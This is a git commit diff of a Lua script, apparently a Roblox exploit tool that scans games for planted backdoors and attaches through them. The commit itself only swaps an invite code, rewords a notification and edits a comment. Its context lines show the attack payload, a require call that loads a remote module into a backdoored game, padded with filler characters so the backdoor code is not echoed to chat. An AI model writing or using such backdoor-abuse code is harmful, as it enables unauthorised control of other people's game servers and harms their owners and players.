4102cbf15e49b8cb4fd8e54cdb8872864ea60925
L1ghtingBolt <82386159+L1ghtingBolt@users.noreply.github.com>
2022-02-23 08:15:32 +0100

    Update source.lua

--- source.lua
+++ source.lua
@@ -29,7 +29,7 @@ local StarterGui = game:GetService("StarterGui")
 
 local LocalPlayer = game:GetService("Players").LocalPlayer
 local requireScript = ("require(8530655817).k4scripts('%s', %s) -- "):format(LocalPlayer.Name, "true", string.rep("!", 2400)) -- set true to false to disable logging, we add a filler so that the backdoor code won't be send to the chat, by default, only message with 200 characters (or 1,200 bytes) can be send, we multipy it by 2 to be safe.
-local invCode = "6HndYgC"
+local invCode = "w8SkzPz9qQ"
 
 local alternativeSS = {
 	run = { [1] = "5#lGIERKWEF" },
@@ -170,7 +170,7 @@ local function Main()
 	scanGame()
 
 	if not attached(3.5) then
-		notify("Unable to find backdoor.\nGame not backdoored?")
+		notify("Unable to find any backdoors.\nGame not backdoored?")
 	end
 end
 
@@ -178,7 +178,7 @@ if game:IsLoaded() then
 	pcall(Main)
 end
 
---	k4scripts
+--	k4scripts (This is an edit).
 --	.------.
 --	|4.--. |
 --	| :│/: |
